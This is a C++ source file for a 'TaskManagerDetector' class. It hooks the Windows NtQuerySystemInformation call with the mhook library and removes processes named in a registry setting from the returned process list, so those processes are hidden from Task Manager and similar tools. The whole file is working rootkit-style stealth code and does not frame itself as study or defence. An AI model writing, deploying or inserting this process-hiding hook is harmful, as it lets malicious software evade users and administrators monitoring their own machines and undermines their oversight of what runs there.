#include "stdafx.h"
#include "TaskManagerDetector.h"
#include "Utils.h"
#include "mhook-master\mhook-lib\mhook.h"

std::unique_ptr<TaskManagerDetector> TaskManagerDetector::m_instance(nullptr);
namespace
{
    typedef struct _MY_SYSTEM_PROCESS_INFORMATION
    {
        ULONG                   NextEntryOffset;
        ULONG                   NumberOfThreads;
        LARGE_INTEGER           Reserved[3];
        LARGE_INTEGER           CreateTime;
        LARGE_INTEGER           UserTime;
        LARGE_INTEGER           KernelTime;
        UNICODE_STRING          ImageName;
        ULONG                   BasePriority;
        HANDLE                  ProcessId;
        HANDLE                  InheritedFromProcessId;
    } MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

    using CurNtQuerySystemInformation = NTSTATUS(__stdcall *)(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                                               PVOID SystemInformation,
                                                               ULONG SystemInformationLength,
                                                               PULONG ReturnLength);
}

CurNtQuerySystemInformation trueNtQuerySystemInformation = nullptr;

std::unique_ptr<TaskManagerDetector> & TaskManagerDetector::GetInstance()
{
    if (m_instance.get() == nullptr)
    {
        m_instance.reset(new TaskManagerDetector);
    }
    return m_instance;
}

bool TaskManagerDetector::InstallHooks()
{
    trueNtQuerySystemInformation = reinterpret_cast<CurNtQuerySystemInformation>(GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation"));
    if (!trueNtQuerySystemInformation)
    {
        return false;
    }

    if (!Mhook_SetHook(reinterpret_cast<PVOID*>(&trueNtQuerySystemInformation), &TaskManagerDetector::NtQuerySystemInformationHook))
    {
        return false;
    }
    
    return true;
}

NTSTATUS __stdcall TaskManagerDetector::NtQuerySystemInformationHook(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
    PMY_SYSTEM_PROCESS_INFORMATION pNext = NULL;
    bool findProcess = false;
    std::vector<std::wstring> processList;
    std::vector<PMY_SYSTEM_PROCESS_INFORMATION> newSystemInformation;

    NTSTATUS status = trueNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (NT_SUCCESS(status) && SystemInformationClass == SystemProcessInformation)
    {
        if (!LoadMultiString(CONFIG_REGISTRY_PROCESS_HIDE, processList))
        {
            return status;
        }
        pCurrent = nullptr;
        pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

        do
        {
            pCurrent = pNext;
            pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
            findProcess = false;
            std::wstring imageName = std::wstring(pNext->ImageName.Buffer, pNext->ImageName.Length / sizeof(wchar_t));
            for (const auto & processName : processList)
            {
                if (toLowerW(processName).compare(toLowerW(imageName)) == 0)
                {
                    findProcess = true;
                    break;
                }
            }

            if (findProcess)
            {
                if (0 == pNext->NextEntryOffset)
                {
                    pCurrent->NextEntryOffset = 0;
                }
                else
                {
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
                }

                pNext = pCurrent;
            }
        } while (pCurrent->NextEntryOffset != 0);
    }

    return status;
}
